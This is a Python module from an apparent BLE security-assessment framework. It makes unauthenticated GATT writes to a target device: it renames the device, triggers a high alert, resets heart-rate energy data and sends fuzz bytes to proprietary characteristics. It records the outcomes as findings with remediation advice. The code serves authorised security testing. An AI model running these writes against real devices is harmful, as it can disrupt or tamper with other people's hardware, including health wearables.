"""
Stage 8 — GATT Semantic PoC / Targeted Interaction

Uses the WHAD Python Central API directly — no subprocess, no output parsing.
Every write result comes from the ATT layer response: no inference, no guessing.

  Phase 1 — Baseline reads: capture current device state by handle.

  Phase 2 — Semantic writes by UUID with live API feedback:
    0x2A00 (Device Name)  : rename → "BLE-PoC", read back to confirm, restore
    0x2A06 (Alert Level)  : High Alert (0x02) → dwell → No Alert (0x00)
    0x2A39 (HR Ctrl Point): Reset Energy Expended (0x01)
    Proprietary write UUID: subscribe notify pair, send probes, capture responses

  Phase 3 — Record: per-write outcomes, ATT error reasons, confirmed read-backs.

Requires the full GATT profile (list[dict]) as returned by s5_interact.run().
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone

from whad.ble.exceptions import ConnectionLostException

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger
from core.pcap import pcap_path, attach_monitor, detach_monitor

log = get_logger("s8_poc")

CONNECT_TIMEOUT  = 15     # seconds for BLE connection
DISCOVER_TIMEOUT = 20     # seconds for GATT discovery (needed for char() / notify)
NOTIFY_DWELL     = 3.0    # seconds to collect notify responses after probe writes
ALERT_DWELL      = 2.0    # pause between High Alert trigger and restore
POC_NAME         = "BLE-PoC"

# Generic proprietary channel probes — single, two, and three-byte sequences.
# Applied to any unknown write characteristic; notify pair captures responses.
_PROPRIETARY_PROBES: list[bytes] = [
    bytes([0x00]),
    bytes([0x01]),
    bytes([0x02]),
    bytes([0x03]),
    bytes([0xff]),
    bytes([0x00, 0x00]),
    bytes([0x01, 0x00]),
    bytes([0x02, 0x00]),
    bytes([0x03, 0x00]),
    bytes([0xff, 0x00]),
    bytes([0x00, 0x01, 0x00]),
    bytes([0x00, 0x02, 0x00]),
]


@dataclass
class WriteResult:
    handle: int
    uuid: str
    label: str        # "rename_poc" | "restore" | "alert_high" | "alert_restore" |
                      # "hr_reset" | "probe"
    data: bytes
    success: bool = False
    error: str | None = None
    readback: bytes | None = None
    readback_confirmed: bool = False


# ── Entry point ───────────────────────────────────────────────────────────────

def run(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
    gatt_profile: list[dict],
) -> None:
    addr      = target.bd_address
    is_random = target.address_type != "public"

    log.info(
        f"[S8] Connecting to {addr}"
        + (" (self-profile, no S5 data)" if not gatt_profile else "")
    )

    central    = dongle.central()
    _monitor   = attach_monitor(central, pcap_path(engagement_id, 8, addr))
    periph_dev = None
    results: list[WriteResult]  = []
    baseline: dict[int, bytes]  = {}
    notifications: list[dict]   = []
    actions: list[dict]         = []
    lock = threading.Lock()

    try:
        periph_dev = central.connect(addr, random=is_random, timeout=CONNECT_TIMEOUT)
        if periph_dev is None:
            log.warning(f"[S8] Could not connect to {addr} (timeout).")
            return

        log.info(f"[S8] Connected to {addr}.")

        # Discovery: needed for char(uuid) notify subscription AND self-profiling.
        discovered = _discover_with_timeout(periph_dev, addr)
        if not discovered:
            log.warning(f"[S8] Discovery failed — notify subscriptions unavailable.")

        # Self-profile when Stage 5 didn't run or found no characteristics.
        # Stage 7 may have found writable handles without a full profile.
        if not gatt_profile and discovered:
            gatt_profile = _enumerate_profile(dongle, periph_dev)
            log.info(
                f"[S8] Self-profiled {addr}: "
                f"{len(gatt_profile)} characteristic(s) found"
            )

        if not gatt_profile:
            log.warning(f"[S8] No GATT profile for {addr} — skipping PoC.")
            return

        writable = [
            c for c in gatt_profile
            if "write" in c.get("properties", []) or "write_no_resp" in c.get("properties", [])
        ]
        readable = [c for c in gatt_profile if "read" in c.get("properties", [])]
        notify_uuids = {
            c["uuid"].upper() for c in gatt_profile
            if "notify" in c.get("properties", [])
        }

        if not writable:
            log.info(f"[S8] No writable characteristics on {addr}.")
            return

        actions = _plan_actions(writable, notify_uuids)
        if not actions:
            log.info(f"[S8] No semantic actions applicable for {addr}.")
            return

        log.info(
            f"[S8] {len(actions)} action(s): "
            f"{', '.join(a['label'] for a in actions)}"
        )

        # Phase 1 — Baseline reads (by handle; no discovery required)
        for char in readable[:8]:
            h = char["value_handle"]
            try:
                raw = periph_dev.read(h)
                if raw is not None:
                    baseline[h] = bytes(raw)
                    log.debug(
                        f"[S8] Baseline h={h} ({char['uuid'][:8]}...): {bytes(raw).hex()}"
                    )
            except Exception as exc:
                log.debug(f"[S8] Baseline read h={h}: {_exc_summary(exc)}")

        # Phase 2 — Semantic writes
        for action in actions:
            label  = action["label"]
            handle = action["handle"]
            uuid   = action["uuid"]

            if label == "device_name_rename":
                results.extend(
                    _do_rename(
                        periph_dev, handle, uuid,
                        baseline.get(handle),
                        target.name or "",
                    )
                )
            elif label == "alert_level_trigger":
                results.extend(_do_alert(periph_dev, handle, uuid))
            elif label == "hr_control_reset":
                results.extend(_do_hr_reset(periph_dev, handle, uuid))
            elif label == "proprietary_probe":
                results.extend(
                    _do_probe(
                        periph_dev, action, notify_uuids,
                        notifications, lock, discovered,
                    )
                )

    except ConnectionLostException:
        log.warning(f"[S8] Connection lost during PoC on {addr}.")
    except Exception as exc:
        log.error(f"[S8] PoC error on {addr}: {type(exc).__name__}: {exc}")
    finally:
        if periph_dev is not None:
            try:
                periph_dev.disconnect()
            except Exception:
                pass
        detach_monitor(_monitor)

    evidence = _build_evidence(results, baseline, notifications)
    _record_finding(target, engagement_id, actions, results, evidence)
    _print_summary(target, actions, results, evidence)


# ── Action planning ───────────────────────────────────────────────────────────

def _plan_actions(writable: list[dict], notify_uuids: set[str]) -> list[dict]:
    actions: list[dict] = []
    for char in writable:
        uuid      = char["uuid"].upper()
        handle    = char["value_handle"]
        uuid_norm = _normalize_uuid(uuid)  # short form for BT SIG; unchanged for vendor

        if uuid_norm == "2A00":
            actions.append({"label": "device_name_rename", "handle": handle, "uuid": uuid})
        elif uuid_norm == "2A06":
            actions.append({"label": "alert_level_trigger", "handle": handle, "uuid": uuid})
        elif uuid_norm == "2A39":
            actions.append({"label": "hr_control_reset", "handle": handle, "uuid": uuid})
        else:
            has_pair = _has_notify_pair(uuid, notify_uuids)
            if has_pair:
                log.info(
                    f"[S8] h={handle} ({uuid[:8]}...) has companion notify "
                    "— responses will be captured in real-time."
                )
            actions.append({
                "label":           "proprietary_probe",
                "handle":          handle,
                "uuid":            uuid,
                "probe_count":     len(_PROPRIETARY_PROBES),
                "has_notify_pair": has_pair,
            })
    return actions


# ── Semantic write phases ─────────────────────────────────────────────────────

def _do_rename(
    periph_dev,
    handle: int,
    uuid: str,
    original_bytes: bytes | None,
    original_name: str,
) -> list[WriteResult]:
    results: list[WriteResult] = []
    poc_bytes = POC_NAME.encode("utf-8")

    wr = WriteResult(handle=handle, uuid=uuid, label="rename_poc", data=poc_bytes)
    try:
        periph_dev.write(handle, poc_bytes)
        wr.success = True
        log.info(f"[S8] 0x2A00 h={handle}: WRITE OK — '{POC_NAME}' ({poc_bytes.hex()})")
    except Exception as exc:
        wr.error = _exc_summary(exc)
        log.info(f"[S8] 0x2A00 h={handle}: WRITE FAILED — {wr.error}")
    results.append(wr)

    if wr.success:
        try:
            rb = periph_dev.read(handle)
            if rb is not None:
                wr.readback = bytes(rb)
                if poc_bytes in bytes(rb):
                    wr.readback_confirmed = True
                    log.info(
                        f"[S8] 0x2A00 h={handle}: READ-BACK CONFIRMED "
                        f"→ {bytes(rb).hex()}"
                    )
                else:
                    log.info(
                        f"[S8] 0x2A00 h={handle}: read-back mismatch "
                        f"→ {bytes(rb).hex()}"
                    )
        except Exception as exc:
            log.debug(f"[S8] 0x2A00 h={handle}: read-back failed — {_exc_summary(exc)}")

    restore = original_bytes or (original_name.encode("utf-8") if original_name else None)
    if restore:
        try:
            periph_dev.write(handle, restore)
            log.debug(f"[S8] 0x2A00 h={handle}: restored → {restore.hex()}")
        except Exception as exc:
            log.debug(f"[S8] 0x2A00 h={handle}: restore failed — {_exc_summary(exc)}")

    return results


def _do_alert(periph_dev, handle: int, uuid: str) -> list[WriteResult]:
    results: list[WriteResult] = []

    r_high = WriteResult(handle=handle, uuid=uuid, label="alert_high", data=bytes([0x02]))
    try:
        periph_dev.write(handle, bytes([0x02]))
        r_high.success = True
        log.info(f"[S8] 0x2A06 h={handle}: WRITE OK — High Alert (0x02)")
    except Exception as exc:
        r_high.error = _exc_summary(exc)
        log.info(f"[S8] 0x2A06 h={handle}: WRITE FAILED — {r_high.error}")
    results.append(r_high)

    if r_high.success:
        time.sleep(ALERT_DWELL)

    r_off = WriteResult(handle=handle, uuid=uuid, label="alert_restore", data=bytes([0x00]))
    try:
        periph_dev.write(handle, bytes([0x00]))
        r_off.success = True
        log.info(f"[S8] 0x2A06 h={handle}: WRITE OK — No Alert (0x00) restored")
    except Exception as exc:
        r_off.error = _exc_summary(exc)
        log.debug(f"[S8] 0x2A06 h={handle}: restore failed — {r_off.error}")
    results.append(r_off)

    return results


def _do_hr_reset(periph_dev, handle: int, uuid: str) -> list[WriteResult]:
    r = WriteResult(handle=handle, uuid=uuid, label="hr_reset", data=bytes([0x01]))
    try:
        periph_dev.write(handle, bytes([0x01]))
        r.success = True
        log.info(f"[S8] 0x2A39 h={handle}: WRITE OK — Reset Energy Expended (0x01)")
    except Exception as exc:
        r.error = _exc_summary(exc)
        log.info(f"[S8] 0x2A39 h={handle}: WRITE FAILED — {r.error}")
    return [r]


def _do_probe(
    periph_dev,
    action: dict,
    notify_uuids: set[str],
    notifications: list[dict],
    lock: threading.Lock,
    discovered: bool,
) -> list[WriteResult]:
    handle   = action["handle"]
    uuid     = action["uuid"]
    has_pair = action.get("has_notify_pair", False)
    results: list[WriteResult] = []

    if has_pair and discovered:
        notify_uuid = _find_notify_pair_uuid(uuid, notify_uuids)
        if notify_uuid:
            try:
                char_obj = periph_dev.char(notify_uuid.lower())
                if char_obj is None:
                    char_obj = periph_dev.char(notify_uuid)
                if char_obj is not None:
                    captured_uuid = notify_uuid  # capture for closure

                    def _cb(_characteristic, value, *_, **__):
                        hex_val = bytes(value).hex() if isinstance(value, (bytes, bytearray)) else str(value)
                        with lock:
                            notifications.append({
                                "uuid":         captured_uuid,
                                "probe_handle": handle,
                                "value_hex":    hex_val,
                                "ts":           datetime.now(timezone.utc).isoformat(),
                            })
                        log.info(f"[S8] NOTIFY {captured_uuid[:8]}...: {hex_val}")

                    char_obj.subscribe(notification=True, callback=_cb)
                    log.debug(f"[S8] Subscribed to notify pair {notify_uuid[:8]}...")
            except Exception as exc:
                log.debug(f"[S8] Notify subscribe failed: {_exc_summary(exc)}")

    for probe_bytes in _PROPRIETARY_PROBES:
        r = WriteResult(handle=handle, uuid=uuid, label="probe", data=probe_bytes)
        try:
            periph_dev.write_command(handle, probe_bytes)
            r.success = True
        except Exception as exc:
            r.error = _exc_summary(exc)
        results.append(r)

    n_ok = sum(1 for r in results if r.success)
    log.info(
        f"[S8] Probe h={handle} ({uuid[:8]}...): "
        f"{n_ok}/{len(results)} writes accepted"
    )

    if has_pair:
        time.sleep(NOTIFY_DWELL)

    return results


# ── Helpers ───────────────────────────────────────────────────────────────────

# BLE property bitmask constants (same as s5_interact)
_PROP_READ     = 0x02
_PROP_WRITE_NR = 0x04
_PROP_WRITE    = 0x08
_PROP_NOTIFY   = 0x10
_PROP_INDICATE = 0x20

# All standard BT SIG 128-bit UUIDs share this suffix after position 8.
# Using [9:] to match "notify pairs" on this suffix produces false positives
# (every standard char would match every other standard notify char).
_BT_SIG_SUFFIX = "0000-1000-8000-00805F9B34FB"


def _normalize_uuid(uuid: str) -> str:
    """Return the 4-hex short form for BT SIG UUIDs; leave vendor UUIDs unchanged.

    Handles both formats WHAD may return:
      short : "2A00"
      full  : "00002A00-0000-1000-8000-00805F9B34FB"
    """
    if "-" not in uuid:
        return uuid
    # BT SIG pattern: 0000XXXX-0000-1000-8000-00805F9B34FB
    if uuid[:4] == "0000" and uuid[9:] == _BT_SIG_SUFFIX:
        return uuid[4:8]   # "00002A00-..." → "2A00"
    return uuid


def _enumerate_profile(dongle: WhadDongle, periph_dev) -> list[dict]:
    """Build a GATT profile dict list from an already-discovered connection.

    Called when Stage 5 didn't run or produced no profile. Uses the same
    dongle adapter methods as Stage 5's Python API path.
    """
    chars: list[dict] = []
    try:
        for service in dongle.periph_services(periph_dev):
            for char in dongle.periph_chars(service):
                raw = getattr(char, "properties", 0)
                if isinstance(raw, int):
                    props: list[str] = []
                    if raw & _PROP_READ:     props.append("read")
                    if raw & _PROP_WRITE_NR: props.append("write_no_resp")
                    if raw & _PROP_WRITE:    props.append("write")
                    if raw & _PROP_NOTIFY:   props.append("notify")
                    if raw & _PROP_INDICATE: props.append("indicate")
                elif isinstance(raw, (list, tuple)):
                    props = [str(p) for p in raw]
                else:
                    props = []
                chars.append({
                    "uuid":          str(char.uuid).upper(),
                    "uuid_name":     "",
                    "handle":        char.handle,
                    "value_handle":  char.value_handle,
                    "properties":    props,
                    "requires_auth": False,
                    "value_text":    None,
                    "value_hex":     None,
                })
    except Exception as exc:
        log.warning(f"[S8] Profile enumeration error: {_exc_summary(exc)}")
    return chars


def _discover_with_timeout(periph_dev, addr: str) -> bool:
    exc_holder: list[Exception] = []
    done = threading.Event()

    def _do() -> None:
        try:
            periph_dev.discover()
        except Exception as exc:
            exc_holder.append(exc)
        finally:
            done.set()

    t = threading.Thread(target=_do, daemon=True)
    t.start()
    if not done.wait(timeout=DISCOVER_TIMEOUT):
        log.warning(f"[S8] GATT discovery timed out on {addr} after {DISCOVER_TIMEOUT}s")
        return False
    if exc_holder:
        log.warning(f"[S8] GATT discovery failed: {_exc_summary(exc_holder[0])}")
        return False
    log.debug(f"[S8] GATT discovery complete on {addr}.")
    return True


def _has_notify_pair(write_uuid: str, notify_uuids: set[str]) -> bool:
    """True if write_uuid has a companion notify UUID in the same vendor service.

    Only applies to vendor 128-bit UUIDs. All BT SIG standard UUIDs share the
    suffix 0000-1000-8000-00805F9B34FB, so [9:] matching on them produces
    false positives (every standard char pairs with every other standard notify).
    """
    if "-" not in write_uuid:
        return False
    if write_uuid[9:] == _BT_SIG_SUFFIX:  # BT SIG UUID — skip
        return False
    suffix = write_uuid[9:]
    return any(
        "-" in n and n[9:] == suffix and n != write_uuid and n[9:] != _BT_SIG_SUFFIX
        for n in notify_uuids
    )


def _find_notify_pair_uuid(write_uuid: str, notify_uuids: set[str]) -> str | None:
    if "-" not in write_uuid:
        return None
    if write_uuid[9:] == _BT_SIG_SUFFIX:
        return None
    suffix = write_uuid[9:]
    for n in notify_uuids:
        if "-" in n and n[9:] == suffix and n != write_uuid and n[9:] != _BT_SIG_SUFFIX:
            return n
    return None


def _exc_summary(exc: Exception) -> str:
    msg = str(exc).strip() or type(exc).__name__
    first_line = msg.splitlines()[0] if "\n" in msg else msg
    return f"{type(exc).__name__}: {first_line[:100]}"


# ── Evidence + finding ────────────────────────────────────────────────────────

def _build_evidence(
    results: list[WriteResult],
    baseline: dict[int, bytes],
    notifications: list[dict],
) -> dict:
    successes = [r for r in results if r.success]
    failures  = [r for r in results if not r.success]
    confirmed = [r for r in results if r.readback_confirmed]
    return {
        "write_count":       len(successes),
        "error_count":       len(failures),
        "confirmed_poc_name": POC_NAME if confirmed else None,
        "notifications":     notifications,
        "baseline_reads":    {str(h): v.hex() for h, v in baseline.items()},
        "write_results": [
            {
                "handle":       r.handle,
                "uuid":         r.uuid,
                "label":        r.label,
                "data_hex":     r.data.hex(),
                "success":      r.success,
                "error":        r.error,
                "readback_hex": r.readback.hex() if r.readback else None,
                "confirmed":    r.readback_confirmed,
            }
            for r in results
        ],
    }


def _record_finding(
    target: Target,
    engagement_id: str,
    actions: list[dict],
    results: list[WriteResult],
    evidence: dict,
) -> None:
    labels         = {a["label"] for a in actions}
    write_count    = evidence["write_count"]
    confirmed_name = evidence["confirmed_poc_name"]

    parts: list[str] = []

    if "device_name_rename" in labels:
        rename_wr = [r for r in results if r.label == "rename_poc"]
        if confirmed_name:
            parts.append(
                f"renamed device to '{POC_NAME}' via 0x2A00 without auth "
                "(confirmed by read-back)"
            )
        elif any(r.success for r in rename_wr):
            parts.append(
                "write to 0x2A00 (Device Name) accepted without auth "
                "(read-back unavailable — char not readable without pairing)"
            )
        else:
            errs = [r.error for r in rename_wr if r.error]
            parts.append(
                f"0x2A00 (Device Name) write rejected: "
                f"{errs[0] if errs else 'unknown error'}"
            )

    if "alert_level_trigger" in labels:
        alert_wr = [r for r in results if r.label == "alert_high"]
        if any(r.success for r in alert_wr):
            parts.append("Alert Level (0x2A06) set to High Alert without auth")
        else:
            parts.append("Alert Level (0x2A06) write rejected")

    if "hr_control_reset" in labels:
        hr_wr = [r for r in results if r.label == "hr_reset"]
        if any(r.success for r in hr_wr):
            parts.append("HR Control Point (0x2A39) reset without auth")

    if "proprietary_probe" in labels:
        for a in (x for x in actions if x["label"] == "proprietary_probe"):
            h     = a["handle"]
            pr    = [r for r in results if r.label == "probe" and r.handle == h]
            n_ok  = sum(1 for r in pr if r.success)
            n_ntf = sum(1 for n in evidence["notifications"] if n.get("probe_handle") == h)
            parts.append(
                f"proprietary channel h={h} ({a['uuid'][:8]}...): "
                f"{n_ok}/{len(pr)} probes accepted"
                + (f", {n_ntf} notify response(s)" if n_ntf else "")
            )

    if not parts:
        parts.append("no writes succeeded — all ATT requests rejected")

    is_meaningful = "device_name_rename" in labels or "alert_level_trigger" in labels
    if confirmed_name or (write_count > 0 and is_meaningful):
        severity = "high"
    elif write_count > 0:
        severity = "medium"
    else:
        severity = "low"

    notify_count = len(evidence["notifications"])
    desc = (
        f"GATT PoC on {target.bd_address} ({target.name or 'unnamed'}): "
        + "; ".join(parts)
        + (f" — {notify_count} notify response(s) captured." if notify_count else ".")
    )

    finding = Finding(
        type="gatt_poc",
        severity=severity,
        target_addr=target.bd_address,
        description=desc,
        remediation=(
            "Require LE Secure Connections (LESC) with MITM for all characteristic writes. "
            "Device Name (0x2A00) should be read-only or auth-gated. "
            "Set ATT_PERMISSION_AUTHEN_WRITE on all writable characteristics."
        ),
        evidence=evidence,
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [{severity}] gatt_poc: {target.bd_address} — {'; '.join(parts)}")


def _print_summary(
    target: Target,
    actions: list[dict],
    results: list[WriteResult],
    evidence: dict,
) -> None:
    print("\n" + "─" * 76)
    print("  STAGE 8 SUMMARY -- GATT PoC / Semantic Interaction")
    print("─" * 76)
    confirmed_name = evidence.get("confirmed_poc_name")
    display_name   = (
        f"{confirmed_name}  (confirmed via 0x2A00 read-back)"
        if confirmed_name
        else target.name or "(unnamed)"
    )
    print(f"  {'Target':<18}: {target.bd_address}")
    print(f"  {'Name':<18}: {display_name}")
    print()
    print("  Actions performed:")

    for action in actions:
        label  = action["label"]
        handle = action["handle"]
        uuid   = action["uuid"]

        if label == "device_name_rename":
            wr = next((r for r in results if r.label == "rename_poc"), None)
            if wr and wr.success:
                rb_note = (
                    "  read-back: CONFIRMED" if wr.readback_confirmed
                    else f"  read-back: {'mismatch' if wr.readback else 'unavailable (auth required)'}"
                )
                print(f"    [0x2A00  h={handle}]  WRITE OK — '{POC_NAME}'{rb_note} → restored")
            elif wr:
                print(f"    [0x2A00  h={handle}]  WRITE FAILED — {wr.error}")

        elif label == "alert_level_trigger":
            r_high = next((r for r in results if r.label == "alert_high"), None)
            r_off  = next((r for r in results if r.label == "alert_restore"), None)
            high_s = "OK" if (r_high and r_high.success) else f"FAIL ({r_high.error if r_high else '?'})"
            off_s  = "OK" if (r_off  and r_off.success)  else "FAIL"
            print(f"    [0x2A06  h={handle}]  High Alert (0x02): {high_s}  →  No Alert (0x00): {off_s}")

        elif label == "hr_control_reset":
            r = next((r for r in results if r.label == "hr_reset"), None)
            status = "OK" if (r and r.success) else f"FAIL ({r.error if r else '?'})"
            print(f"    [0x2A39  h={handle}]  Reset Energy Expended (0x01): {status}")

        elif label == "proprietary_probe":
            pr     = [r for r in results if r.label == "probe" and r.handle == handle]
            n_ok   = sum(1 for r in pr if r.success)
            n_ntf  = sum(1 for n in evidence["notifications"] if n.get("probe_handle") == handle)
            pair_s = "  [notify pair]" if action.get("has_notify_pair") else ""
            ntf_s  = f"  [{n_ntf} response(s) captured]" if n_ntf else ""
            print(
                f"    [{uuid[:8]}... h={handle}]  "
                f"{n_ok}/{len(pr)} probes accepted{pair_s}{ntf_s}"
            )

    wc = evidence["write_count"]
    ec = evidence["error_count"]
    nc = len(evidence.get("notifications", []))
    print(f"\n  Writes accepted        : {wc}")
    print(f"  Writes rejected        : {ec}")
    if nc:
        print(f"  Notify responses       : {nc}")
        print(f"\n  Notify data:")
        for n in evidence["notifications"][:8]:
            ts = n.get("ts", "")[-13:-5] if n.get("ts") else "?"
            print(f"    {ts}  {n.get('uuid', '')[:16]}...  {n.get('value_hex', '')[:32]}")

    if evidence.get("baseline_reads"):
        print(f"\n  Baseline reads ({len(evidence['baseline_reads'])}):")
        for h_str, hex_val in list(evidence["baseline_reads"].items())[:6]:
            print(f"    h={h_str}: {hex_val[:40]}{'…' if len(hex_val) > 40 else ''}")

    if wc == 0 and ec == 0:
        print("\n  [!] No writes executed — connection or profile issue.")

    print("─" * 76 + "\n")
